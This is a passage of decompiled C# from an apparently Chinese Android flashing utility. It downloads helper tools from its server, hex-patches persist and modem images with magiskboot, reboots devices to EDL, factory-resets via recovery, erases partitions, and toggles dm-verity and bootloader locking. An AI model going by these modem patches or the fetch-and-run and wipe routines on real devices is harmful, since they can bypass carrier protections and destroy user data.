		object uriString = (string)this.m_25 + "/TMFTool/acc.zip" + (string)obj2;
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		object obj5 = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
		object path = "TMFTool_" + (string)obj5;
		object obj6 = Path.Combine((string)folderPath, (string)path);
		Directory.CreateDirectory((string)obj6);
		object obj7 = new DirectoryInfo((string)obj6);
		if ((((FileSystemInfo)obj7).Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
		{
			((FileSystemInfo)obj7).Attributes &= ~FileAttributes.ReadOnly;
		}
		object obj8 = Path.Combine((string)obj6, Path.GetFileName((string)fileName));
		File.Copy((string)fileName, (string)obj8, overwrite: true);
		File.SetAttributes((string)obj8, File.GetAttributes((string)obj8) & ~FileAttributes.ReadOnly);
		if (!File.Exists((string)obj4) && !File.Exists((string)fileName2))
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("当前操作: 修改persist\n");
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("用户选择的文件路径: " + (string)fileName + "\n");
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("下载必要资源...");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			try
			{
				object obj9 = new WebClient();
				try
				{
					await ((WebClient)obj9).DownloadFileTaskAsync(new Uri((string)uriString), (string)obj4);
					ZipFile.ExtractToDirectory((string)obj4, (string)obj3);
					if (File.Exists((string)obj4))
					{
						File.Delete((string)obj4);
						fa();
						((TextBoxBase)this.m_c8).AppendText("OK\n");
						((TextBoxBase)this.m_c8).ScrollToCaret();
					}
				}
				finally
				{
					((IDisposable)obj9)?.Dispose();
				}
			}
			catch (Exception)
			{
				((RichTextBox)this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)this.m_c8).AppendText("Error\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				return;
			}
		}
		((RichTextBox)this.m_c8).SelectionColor = Color.Black;
		((TextBoxBase)this.m_c8).AppendText("开始修改文件...");
		try
		{
			object arguments = "--hexpatch \"" + (string)obj8 + "\" 66647364 00000000";
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)fileName2,
				Arguments = (string)arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				CreateNoWindow = true
			};
			object obj10 = new Process();
			try
			{
				((Process)obj10).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj10).Start();
				await ((Process)obj10).StandardOutput.ReadToEndAsync();
				await ((Process)obj10).StandardError.ReadToEndAsync();
				((Process)obj10).WaitForExit();
				if (((Process)obj10).ExitCode == 0)
				{
					((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
					((TextBoxBase)this.m_c8).AppendText("OK\n");
					((TextBoxBase)this.m_c8).ScrollToCaret();
					((TextBoxBase)this.m_c8).AppendText("保存的文件路径: " + (string)obj8 + "\n");
					_12f(obj6);
				}
				else
				{
					((RichTextBox)this.m_c8).SelectionColor = Color.Red;
					((TextBoxBase)this.m_c8).AppendText("Error\n");
					((TextBoxBase)this.m_c8).ScrollToCaret();
				}
			}
			finally
			{
				((IDisposable)obj10)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	private void _12f(object folderPath)
	{
		try
		{
			Process.Start("explorer.exe", (string)folderPath);
		}
		catch (Exception ex)
		{
			((TextBoxBase)this.m_c8).AppendText("打开文件夹失败: " + ex.Message + "\n");
		}
	}

	private async void _130(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = new OpenFileDialog
		{
			Filter = "IMG Files (*.img)|*.img|All Files (*.*)|*.*"
		};
		if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
		{
			return;
		}
		object obj2 = "?encryptedRequest=" + await _21();
		object fileName = ((FileDialog)obj).FileName;
		object obj3 = "C:\\TMFTool";
		object obj4 = Path.Combine((string)obj3, "acc.zip");
		object magiskBootExePath = Path.Combine((string)obj3, "magiskboot.exe");
		object uriString = (string)this.m_25 + "/TMFTool/acc.zip" + (string)obj2;
		object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		object obj5 = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
		object path = "TMFTool_" + (string)obj5;
		object obj6 = Path.Combine((string)folderPath, (string)path);
		Directory.CreateDirectory((string)obj6);
		object obj7 = new DirectoryInfo((string)obj6);
		if ((((FileSystemInfo)obj7).Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
		{
			((FileSystemInfo)obj7).Attributes &= ~FileAttributes.ReadOnly;
		}
		object obj8 = Path.Combine((string)obj6, Path.GetFileName((string)fileName));
		File.Copy((string)fileName, (string)obj8, overwrite: true);
		File.SetAttributes((string)obj8, File.GetAttributes((string)obj8) & ~FileAttributes.ReadOnly);
		((RichTextBox)this.m_c8).SelectionColor = Color.Black;
		((TextBoxBase)this.m_c8).AppendText("当前操作: 修改modem\n");
		((RichTextBox)this.m_c8).SelectionColor = Color.Black;
		((TextBoxBase)this.m_c8).AppendText("用户选择的文件路径: " + (string)fileName + "\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		if (!File.Exists((string)magiskBootExePath))
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("下载资源...");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			try
			{
				object obj9 = new WebClient();
				try
				{
					await ((WebClient)obj9).DownloadFileTaskAsync(new Uri((string)uriString), (string)obj4);
					ZipFile.ExtractToDirectory((string)obj4, (string)obj3);
					((TextBoxBase)this.m_c8).ScrollToCaret();
					if (File.Exists((string)obj4))
					{
						File.Delete((string)obj4);
						fa();
						((TextBoxBase)this.m_c8).AppendText("OK\n");
						((TextBoxBase)this.m_c8).ScrollToCaret();
					}
				}
				finally
				{
					((IDisposable)obj9)?.Dispose();
				}
			}
			catch (Exception)
			{
				((RichTextBox)this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)this.m_c8).AppendText("Error\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				return;
			}
		}
		((RichTextBox)this.m_c8).SelectionColor = Color.Black;
		((TextBoxBase)this.m_c8).AppendText("开始修改文件1...");
		nint num2 = ((await _131(magiskBootExePath, obj8, "63617264617070", "00000000000000")) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
			((TextBoxBase)this.m_c8).AppendText("OK\n");
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("开始修改文件2...");
			nint num3 = ((await _131(magiskBootExePath, obj8, "41630061007200640061", "41E50061007200640061")) ? 1 : 0);
			IntPtr intPtr3 = num3;
			if ((int)(nint)intPtr3 != 0)
			{
				((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
				((TextBoxBase)this.m_c8).AppendText("OK\n");
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("修改modem完成！\n");
				((TextBoxBase)this.m_c8).AppendText("保存的文件路径: " + (string)obj8 + "\n");
				_12f(obj6);
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
			else
			{
				((RichTextBox)this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)this.m_c8).AppendText("Error\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("Error\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private async Task<bool> _131(object magiskBootExePath, object filePath, object patch1, object patch2)
	{
		try
		{
			object arguments = "--hexpatch \"" + (string)filePath + "\" " + (string)patch1 + " " + (string)patch2;
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)magiskBootExePath,
				Arguments = (string)arguments,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				CreateNoWindow = true
			};
			object obj = new Process();
			try
			{
				((Process)obj).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj).Start();
				await ((Process)obj).StandardOutput.ReadToEndAsync();
				await ((Process)obj).StandardError.ReadToEndAsync();
				((Process)obj).WaitForExit();
				return ((Process)obj).ExitCode == 0;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj2 = ex;
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("执行 magiskboot.exe 失败: " + ((Exception)obj2).Message + "\n");
			return false;
		}
	}

	private async void _132(object sender, object e)
	{
		Msg("联想重启至EDL...");
		nint num = ((await a9("reboot edl")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		nint num2 = ((await RunFastbootCommandAsync("oem reboot-edl", 8)) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private void _133(object sender, MouseEventArgs e)
	{
	}

	private void _134(object sender, object e)
	{
		if (_1b == null)
		{
			return;
		}
		try
		{
			Process[] processesByName = Process.GetProcessesByName("fh_loader");
			if (processesByName.Length != 0)
			{
				float num = ((PerformanceCounter)_1b).NextValue();
				float num2 = num / 1048576f;
				((Control)this.m_cd).Text = $"{num2:F2} MB/s";
			}
		}
		catch
		{
		}
	}

	private async void _135(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((UITextBox)this.m_c3).Clear();
		((Checkbox)this.m_109).Checked = false;
		object obj = new OpenFileDialog();
		try
		{
			((FileDialog)obj).Title = "请选择firehose引导文件";
			((FileDialog)obj).Filter = "引导文件类型 (*.elf;*.mbn;*.melf)|*firehose*.elf;*firehose*.mbn;xbl_s_devprg_ns.melf|所有文件 (*.*)|*.*";
			if (((CommonDialog)obj).ShowDialog() == DialogResult.OK)
			{
				((Control)this.m_c3).Text = ((FileDialog)obj).FileName;
				object fileName = Path.GetFileName(((FileDialog)obj).FileName);
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("选择引导 :" + (string)fileName + "\n");
			}
			else
			{
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("取消选择引导\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private void _136(object sender, EventArgs e)
	{
	}

	private async void _137(object sender, object e)
	{
		nint num = 0;
		nint num2 = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num2;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((ListView)this.m_d0).Items.Clear();
		((UITextBox)this.m_d5).Clear();
		object obj = new OpenFileDialog
		{
			Filter = "XML Files (rawprogram*.xml)|rawprogram*.xml",
			Multiselect = true
		};
		if (((CommonDialog)obj).ShowDialog() == DialogResult.OK)
		{
			object fileNames = ((FileDialog)obj).FileNames;
			object directoryName = Path.GetDirectoryName((string)((object[])fileNames)[0]);
			((Control)this.m_d5).Text = (string)directoryName;
			object text = "";
			object text2 = ((Control)this.m_d5).Text;
			((TextBoxBase)this.m_c8).AppendText("File :" + (string)text2 + "\n");
			object obj2 = fileNames;
			for (nint num3 = 0; num3 < ((Array)obj2).Length; num3++)
			{
				object uri = ((object[])obj2)[num3];
				object fileName = Path.GetFileName((string)uri);
				if (!((string)fileName).StartsWith("rawprogram") || !((string)fileName).EndsWith(".xml"))
				{
					MessageBox.Show("文件 " + (string)fileName + " 不符合 rawprogram*.xml 格式，请选择正确的文件。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					continue;
				}
				object obj3 = XDocument.Load((string)uri);
				object obj4 = from node in ((XContainer)obj3).Descendants((XName)"program")
					select new ProgramEntry
					{
						Label = (node.Attribute("label")?.Value ?? ""),
						Filename = (node.Attribute("filename")?.Value ?? ""),
						SDname = (node.Attribute("physical_partition_number")?.Value ?? ""),
						Size = (node.Attribute("size_in_KB")?.Value ?? "")
					};
				nint num4 = 1;
				object enumerator = ((IEnumerable<ProgramEntry>)obj4).GetEnumerator();
				try
				{
					while (((IEnumerator)enumerator).MoveNext())
					{
						object current = ((IEnumerator<ProgramEntry>)enumerator).Current;
						object obj5 = new ListViewItem
						{
							Text = ((ProgramEntry)current).Label
						};
						object text3 = (string.IsNullOrEmpty(((ProgramEntry)current).Filename) ? "空文件" : ((ProgramEntry)current).Filename);
						((ListViewItem)obj5).SubItems.Add((string)text3);
						object sDname = ((ProgramEntry)current).SDname;
						nint result = 0;
						NativeValues.TryParseInt32((string)sDname, out result);
						nint num5 = (int)(ushort)(97 + result);
						((ListViewItem)obj5).SubItems.Add("sd" + (char)num5 + (int)num4);
						object text4 = (string.IsNullOrEmpty(((ProgramEntry)current).Filename) ? "双击选择文件" : Path.Combine(Path.GetDirectoryName((string)uri), ((ProgramEntry)current).Filename));
						((ListViewItem)obj5).SubItems.Add((string)text4);
						if (double.TryParse(((ProgramEntry)current).Size, out var result2))
						{
							if (result2 >= 1048576.0)
							{
								text = (result2 / 1048576.0).ToString("F2") + " GB";
							}
							else
							{
								text = ((!(result2 >= 1024.0)) ? (result2.ToString("F2") + " KB") : ((result2 / 1024.0).ToString("F2") + " MB"));
							}
						}
						((ListViewItem)obj5).SubItems.Add((string)text);
						int num6;
						if (!string.IsNullOrEmpty(((ProgramEntry)current).Filename))
						{
							num6 = (int)num;
							num = num6 + 1;
							((ListViewItem)obj5).Checked = true;
						}
						((ListView)this.m_d0).Items.Add((ListViewItem)obj5);
						num6 = (int)num4;
						num4 = num6 + 1;
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("Reading Xml:");
				((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
				((TextBoxBase)this.m_c8).AppendText((string)fileName + "\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		((CheckBox)this.m_d6).Checked = false;
		Msg("刷写分区数:");
		fa();
		Msg($"{(int)num}\n");
	}

	private void _138(object sender, object e)
	{
		if (((KeyEventArgs)e).KeyCode != Keys.Return)
		{
			return;
		}
		string value = ((Control)this.m_d8).Text.Trim();
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (ListViewItem item in ((ListView)this.m_d0).Items)
		{
			item.Selected = false;
			item.BackColor = ((Control)this.m_d0).BackColor;
		}
		foreach (ListViewItem item2 in ((ListView)this.m_d0).Items)
		{
			if (item2.SubItems[0].Text.Equals(value, StringComparison.OrdinalIgnoreCase))
			{
				item2.Selected = true;
				item2.BackColor = Color.LightBlue;
				item2.Focused = true;
				((Control)this.m_d0).Focus();
				item2.EnsureVisible();
				break;
			}
		}
	}

	private void _139(object sender, object e)
	{
		_93();
		if (!this.m_4c)
		{
			if (((System.Windows.Forms.Timer)this.m_39).Enabled)
			{
				((System.Windows.Forms.Timer)this.m_39).Stop();
			}
			this.m_4c = true;
			Message.info((Form)(object)this, "用户请求停止操作！", (Font)null, (int?)null);
			return;
		}
		try
		{
			Process[] processesByName = Process.GetProcessesByName("fh_loader");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
				process.WaitForExit();
			}
			Process[] processesByName2 = Process.GetProcessesByName("simg2img");
			Process[] array2 = processesByName2;
			foreach (Process process2 in array2)
			{
				process2.Kill();
				process2.WaitForExit();
			}
			Process[] processesByName3 = Process.GetProcessesByName("fastboot");
			Process[] array3 = processesByName3;
			foreach (Process process3 in array3)
			{
				process3.Kill();
				process3.WaitForExit();
			}
		}
		catch (Exception)
		{
		}
	}

	private void _13a(object sender, object e)
	{
		((TextBoxBase)this.m_c8).Clear();
	}

	private async Task _13b()
	{
		object obj = "?encryptedRequest=" + await _21();
		object obj2 = Path.Combine(Path.GetTempPath(), "adb_temp");
		Directory.CreateDirectory((string)obj2);
		object obj3 = Path.Combine((string)obj2, "adb.exe");
		object filePath = Path.Combine((string)obj2, "AdbWinApi.dll");
		object filePath2 = Path.Combine((string)obj2, "AdbWinUsbApi.dll");
		if (!File.Exists((string)obj3))
		{
			fe("配置环境...");
			await _111((string)this.m_25 + "/TMFTool/recadb/adb.exe" + (string)obj, obj3);
			await _111((string)this.m_25 + "/TMFTool/recadb/AdbWinApi.dll" + (string)obj, filePath);
			await _111((string)this.m_25 + "/TMFTool/recadb/AdbWinUsbApi.dll" + (string)obj, filePath2);
			fa();
			fe("OK\n");
		}
		fe("Factory reset...");
		object obj4 = await _112(obj3, "format-data");
		fa();
		fe((string)obj4 + "\n");
		_113();
		_114(obj2);
	}

	private async Task<bool> _13c()
	{
		object adbPath = "C:\\TMFTool\\mi_adb.exe";
		object obj = await _112(adbPath, "devices");
		object value = (from line in ((string)obj).Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
			where !line.Contains("List of devices attached")
			select line).ToArray();
		object obj2 = string.Join("\n", (string[])value);
		if (((string)obj).Contains("recovery"))
		{
			fa();
			fe("OK\n");
			fe("NS:");
			fa();
			fe((string)obj2 + "\n");
			return true;
		}
		msgred();
		fe("Error\n请关闭任何占用ADB的程序！在进行尝试！");
		return false;
	}

	private async void _13d(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr != (IntPtr)0)
		{
			await _13b();
		}
	}

	public static string GetJson(string url)
	{
		try
		{
			string text = CommonUtil.Get(url);
			if (string.IsNullOrEmpty(text))
			{
				return "网络访问失败！";
			}
			string text2 = AesDecrypt(text, (string)Form1.m_7a, (string)Form1.m_7b);
			if (!string.IsNullOrEmpty(text2))
			{
				return text2;
			}
			return "解密失败！";
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public static string AesDecrypt(string DecryptStr, string Key, string IV)
	{
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(Key);
			byte[] bytes2 = Encoding.UTF8.GetBytes(IV);
			byte[] array = Convert.FromBase64String(DecryptStr);
			using AesManaged aesManaged = new AesManaged();
			aesManaged.Key = bytes;
			aesManaged.IV = bytes2;
			aesManaged.Mode = CipherMode.CBC;
			aesManaged.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor();
			byte[] bytes3 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			return Encoding.UTF8.GetString(bytes3);
		}
		catch (Exception)
		{
			return null;
		}
	}

	private async void _140(object sender, object e)
	{
	}

	private async void _141(object sender, object e)
	{
		((Control)this.m_cd).Text = "";
		((Control)this.m_107).Text = "";
		falseButtons();
		if (((ListView)this.m_111).CheckedItems.Count == 0)
		{
			MessageBox.Show("请至少选择一个项。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			EnableButtons();
			return;
		}
		((UIProcessBar)this.m_c1).Maximum = ((ListView)this.m_111).CheckedItems.Count;
		((UIProcessBar)this.m_c1).Value = 0;
		object enumerator = ((ListView)this.m_111).CheckedItems.GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (ListViewItem)((IEnumerator)enumerator).Current;
				object text = ((ListViewItem)obj).SubItems[0].Text;
				_ = ((ListViewItem)obj).SubItems[1].Text;
				Msg("FB [Eraseing] ");
				Msg((string)text + "...");
				nint num = ((await _151(text)) ? 1 : 0);
				IntPtr intPtr = num;
				if ((int)(nint)intPtr != 0)
				{
					fa();
					Msg("OK\n");
					if (this.m_4c)
					{
						EnableButtons();
						Log2("操作已取消\n", Color.Red, isBold: true);
						return;
					}
					object obj2 = this.m_c1;
					int value = ((UIProcessBar)obj2).Value;
					((UIProcessBar)obj2).Value = value + 1;
				}
				else
				{
					Msg("Error\n");
					if (this.m_4c)
					{
						EnableButtons();
						Log2("操作已取消\n", Color.Red, isBold: true);
						return;
					}
					((UIProcessBar)this.m_c1).Value = 0;
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		EnableButtons();
		if (((Checkbox)this.m_122).Checked)
		{
			Msg("关闭DM验证...");
			nint num2 = ((await _150("oem cdms")) ? 1 : 0);
			IntPtr intPtr2 = num2;
			if ((int)(nint)intPtr2 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
		if (((Checkbox)_11e).Checked)
		{
			Msg("切换分区A...");
			nint num3 = ((await _150("set_active a")) ? 1 : 0);
			IntPtr intPtr3 = num3;
			if ((int)(nint)intPtr3 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
		if (((Checkbox)this.m_11f).Checked)
		{
			Msg("锁定Bootloader...");
			nint num4 = ((await _150("oem lock")) ? 1 : 0);
			IntPtr intPtr4 = num4;
			if ((int)(nint)intPtr4 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
		if (((Checkbox)this.m_11b).Checked)
		{
			Msg("重启设备...");
			nint num5 = ((await _150("reboot")) ? 1 : 0);
			IntPtr intPtr5 = num5;
			if ((int)(nint)intPtr5 != 0)
			{
				fa();
				Msg("OK\n");
			}
		}
	}

	private void _142(object sender, object e)
	{
		if (((Checkbox)this.m_11b).Checked)
		{
			((Checkbox)this.m_11f).Checked = false;
		}
	}

	private void _143(object sender, EventArgs e)
	{
	}

	private void _144(object sender, EventArgs e)
	{
	}

	private void _145()
	{
		((Checkbox)this.m_11b).Checked = false;
		((Checkbox)_11e).Checked = false;
		((Checkbox)this.m_120).Checked = false;
		((Checkbox)this.m_11f).Checked = false;
		((Checkbox)this.m_121).Checked = false;
		((Checkbox)this.m_122).Checked = false;
		((Control)this.m_11c).Text = null;
	}

	private async void _146(object sender, object e)
	{
		((Control)this.m_cd).Text = "";
		((Control)this.m_107).Text = "";
		try
		{
			falseButtons();
			Msg("等待Fastboot设备...");
			_145();
			object obj = new CancellationTokenSource(TimeSpan.FromSeconds(20.0));
			try
			{
				object obj2 = await _148(((CancellationTokenSource)obj).Token);
				if (string.IsNullOrEmpty((string)obj2))
				{
					EnableButtons();
					msgred();
					Msg("超时\n");
					return;
				}
				fb();
				Msg("OK\n");
				EnableButtons();
				object obj3 = _14a(obj2, "serialno");
				object obj4 = _14a(obj2, "product");
				object obj5 = _14a(obj2, "is-userspace");
				object obj6 = _14a(obj2, "unlocked");
				object obj7 = _14a(obj2, "current-slot");
				obj7 = (string.IsNullOrEmpty((string)obj7) ? "单分区" : obj7);
				object obj8 = (((string)obj6).Equals("yes", StringComparison.OrdinalIgnoreCase) ? "已解锁" : "未解锁");
				object obj9 = (((string)obj5).Equals("yes", StringComparison.OrdinalIgnoreCase) ? "是" : "否");
				if (string.IsNullOrEmpty((string)obj3))
				{
					return;
				}
				Msg("设备代号：" + (string)obj4 + "\n");
				Msg("设备SN：" + (string)obj3 + "\n");
				Msg("设备解锁状态：" + (string)obj8 + " \n");
				Msg("设备当前槽位：" + (string)obj7 + " \n");
				Msg("处于FastbootD：" + (string)obj9 + " \n");
				_147(obj2);
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj10 = ex;
			object msg = "错误: " + ((Exception)obj10).Message;
			Msg((string)msg);
		}
	}

	private void _147(object output)
	{
		string[] array = ((string)output).Split(new char[2] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
		((ListView)this.m_111).Items.Clear();
		string[] array2 = array;
		foreach (string text in array2)
		{
			if (text.Contains("partition-size:"))
			{
				string text2 = text.Substring(text.IndexOf(':') + 1).Trim();
				if (text2.Contains(":"))
				{
					text2 = text2.Substring(0, text2.IndexOf(':')).Trim();
				}
				ListViewItem listViewItem = new ListViewItem(text2);
				listViewItem.SubItems.Add("空文件");
				listViewItem.SubItems.Add("双击选择文件");
				listViewItem.SubItems.Add("NO");
				listViewItem.SubItems.Add("NUll");
				((ListView)this.m_111).Items.Add(listViewItem);
			}
		}
	}

	private async Task<string> _148(CancellationToken cancellationToken)
	{
		object result = string.Empty;
		try
		{
			object obj = new Process();
			try
			{
				((Process)obj).StartInfo.FileName = "C:\\TMFTool\\fastboot.exe";
				((Process)obj).StartInfo.Arguments = "getvar all";
				((Process)obj).StartInfo.RedirectStandardOutput = true;
				((Process)obj).StartInfo.RedirectStandardError = true;
				((Process)obj).StartInfo.UseShellExecute = false;
				((Process)obj).StartInfo.CreateNoWindow = true;
				((Process)obj).Start();
				object obj2 = ((Process)obj).StandardOutput.ReadToEndAsync();
				object obj3 = ((Process)obj).StandardError.ReadToEndAsync();
				await Task.WhenAny(Task.WhenAll<string>((Task<string>)obj2, (Task<string>)obj3), Task.Delay(-1, cancellationToken));
				if (cancellationToken.IsCancellationRequested)
				{
					((Process)obj).Kill();
					return string.Empty;
				}
				object obj4 = await (Task<string>)obj2;
				object obj5 = await (Task<string>)obj3;
				result = (string.IsNullOrWhiteSpace((string)obj4) ? obj5 : obj4);
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj6 = ex;
			result = "错误: " + ((Exception)obj6).Message;
		}
		return (string)result;
	}

	private async Task<string> _149(CancellationToken cancellationToken, object flashCommand)
	{
		object result = string.Empty;
		try
		{
			object CS_0024_003C_003E8__locals15 = new _003C_003Ec__DisplayClass469_0();
			((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process = new Process();
			try
			{
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.FileName = "C:\\TMFTool\\fastboot.exe";
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.Arguments = (string)flashCommand;
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.RedirectStandardOutput = true;
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.RedirectStandardError = true;
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.UseShellExecute = false;
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.CreateNoWindow = true;
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StartInfo.WorkingDirectory = "C:\\TMFTool";
				((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.Start();
				object obj = ((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StandardOutput.ReadToEndAsync();
				object obj2 = ((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.StandardError.ReadToEndAsync();
				object obj3 = Task.Run(() =>
				{
					((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.WaitForExit();
				}, cancellationToken);
				await Task.WhenAll((Task)obj, (Task)obj2, (Task)obj3);
				if (cancellationToken.IsCancellationRequested)
				{
					try
					{
						((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process.Kill();
					}
					catch
					{
					}
					return string.Empty;
				}
				result = await (Task<string>)obj + await (Task<string>)obj2;
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass469_0)CS_0024_003C_003E8__locals15).process).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			object obj5 = ex;
			result = "错误: " + ((Exception)obj5).Message;
		}
		return (string)result;
	}

	private object _14a(object output, object key)
	{
		string pattern = "^\\(bootloader\\)\\s*" + Regex.Escape((string)key) + "\\s*:\\s*(.+)$";
		string[] array = ((string)output).Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
		string[] array2 = array;
		foreach (string text in array2)
		{
			Match match = Regex.Match(text.Trim(), pattern, RegexOptions.IgnoreCase);
			if (match.Success)
			{
				return match.Groups[1].Value.Trim();
			}
		}
		return string.Empty;
	}

	private void _14b(object sender, object e)
	{
		((ListView)this.m_111).Items.Clear();
		((UITextBox)this.m_11c).Clear();
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Script files (*.bat;*.xml)|*.bat;*.xml|Batch files (*.bat)|*.bat|XML files (*.xml)|*.xml|All files (*.*)|*.*";
		openFileDialog.Multiselect = true;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string[] fileNames = openFileDialog.FileNames;
		List<string> list = fileNames.Where((string f) => Path.GetExtension(f).ToLower() == ".bat").ToList();
		List<string> list2 = fileNames.Where((string f) => Path.GetExtension(f).ToLower() == ".xml").ToList();
		if (list.Count > 0 && list2.Count > 0)
		{
			MessageBox.Show("不能同时选择 .bat 和 .xml 文件！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		if (list.Count > 1)
		{
			MessageBox.Show("一次只能选择一个 .bat 文件！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		((Checkbox)this.m_11b).Checked = false;
		((Checkbox)_11e).Checked = false;
		((Checkbox)this.m_120).Checked = false;
		((Checkbox)this.m_11f).Checked = false;
		((Checkbox)this.m_122).Checked = false;

		if (list.Count == 1)
		{
			string text = list[0];
